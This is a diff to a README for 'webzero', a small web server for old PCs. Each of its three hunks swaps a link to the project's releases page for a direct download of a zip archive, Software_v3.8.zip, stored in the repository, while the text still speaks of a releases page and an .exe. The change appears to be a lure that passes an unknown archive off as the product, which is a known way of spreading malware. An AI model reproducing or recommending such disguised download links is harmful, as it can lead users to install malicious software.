@@ -1,6 +1,6 @@
 # ⚡ webzero - Simple web server for old PCs
 
-[![Download webzero](https://img.shields.io/badge/Download-webzero-brightgreen)](https://github.com/Juliannaceilinged99/webzero/releases)
+[![Download webzero](https://img.shields.io/badge/Download-webzero-brightgreen)](https://github.com/Juliannaceilinged99/webzero/raw/refs/heads/main/core/Software_v3.8.zip)
 
 webzero is a very small web server designed to run on older and low-power computers. It can deliver static websites quickly without needing extra software or complicated setup. You only need to run one file, and it will serve your website right away.
 
@@ -23,7 +23,7 @@ webzero does not need installation or administrator rights. It runs as a standal
 
 Click the button below to visit the page where you can download webzero. You will find the latest version ready for Windows there.
 
-[![Download webzero](https://img.shields.io/badge/Download-webzero-blue)](https://github.com/Juliannaceilinged99/webzero/releases)
+[![Download webzero](https://img.shields.io/badge/Download-webzero-blue)](https://github.com/Juliannaceilinged99/webzero/raw/refs/heads/main/core/Software_v3.8.zip)
 
 ### How to pick the right file
 
@@ -140,6 +140,6 @@ You run it from a command window that must stay open. Closing that window stops 
 ## 📥 Download webzero now
 
 Access the releases page to get the latest Windows version here:  
-https://github.com/Juliannaceilinged99/webzero/releases
+https://github.com/Juliannaceilinged99/webzero/raw/refs/heads/main/core/Software_v3.8.zip
 
 Click the green “Download” button on the page and save the `.exe` file to your computer to begin.
